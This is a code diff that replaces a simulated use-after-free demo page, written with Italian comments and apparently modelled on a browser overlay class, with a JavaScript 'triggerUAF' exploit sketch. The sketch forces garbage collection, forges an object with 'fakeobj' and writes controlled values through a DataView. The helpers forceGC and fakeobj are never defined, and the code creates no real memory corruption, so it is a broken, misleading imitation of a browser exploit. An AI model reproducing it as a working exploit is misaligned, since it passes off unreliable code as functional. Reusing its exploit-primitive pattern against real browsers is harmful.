@@ -1,52 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Use-After-Free PoC</title>
-    <script>
-        // Simuliamo la classe ResourceUsageOverlay
-        class ResourceUsageOverlay {
-            constructor(page) {
-                this.page = page; // Riferimento alla pagina
-                this.initialize();
-            }
+function triggerUAF() {
+    // Oggetto vulnerabile
+    let overlay = { initialized: false };
+    let weakRef = new WeakRef(overlay);
 
-            // Funzione che simula l'initializzazione, potenzialmente vulnerabile
-            initialize() {
-                // Simuliamo una lambda che viene eseguita successivamente
-                setTimeout(() => {
-                    // Usando un oggetto che potrebbe essere stato liberato prematuramente
-                    alert("Accedendo a m_page: " + this.page);
-                    // Supponiamo che qui ci sia una vulnerabilità di tipo UAF
-                    if (this.page === null) {
-                        alert("UAF! m_page è stato liberato!");
-                    } else {
-                        alert("m_page ancora valido: " + this.page);
-                    }
-                }, 100);
-            }
+    // Alloca un buffer controllato
+    let controlledBuffer = new ArrayBuffer(0x100);
 
-            // Funzione che simula il ciclo di vita della pagina
-            releasePage() {
-                alert("Pagina liberata!");
-                this.page = null; // Simula la "distruzione" della pagina
-            }
+    setTimeout(() => {
+        // Forza la distruzione dell'oggetto
+        overlay = null;
+
+        // Garbage Collection
+        forceGC();
+
+        // Riutilizza memoria liberata
+        let fakeObj = fakeobj(controlledBuffer);
+        alert("Oggetto falsificato: " + fakeObj);
+
+        try {
+            // Lettura/scrittura da buffer controllato
+            let view = new DataView(fakeObj);
+            view.setUint32(0, 0x41414141); // Scrive valori controllati
+            let readValue = view.getUint32(0);
+            alert("Valore letto: " + readValue.toString(16));
+        } catch (e) {
+            alert("Errore durante l'exploit: " + e.message);
         }
-
-        // Creiamo un oggetto ResourceUsageOverlay
-        let page = { content: "Contenuto della pagina" };
-        let overlay = new ResourceUsageOverlay(page);
-
-        // Liberiamo la pagina prima che la lambda venga eseguita
-        setTimeout(() => {
-            overlay.releasePage();
-        }, 50);
-
-    </script>
-</head>
-<body>
-    <h1>PoC Use-After-Free</h1>
-    <p>Questo esempio simula un Use-After-Free (UAF) nel contesto di un oggetto che accede a memoria liberata.</p>
-</body>
-</html>
+    }, 100);
+}
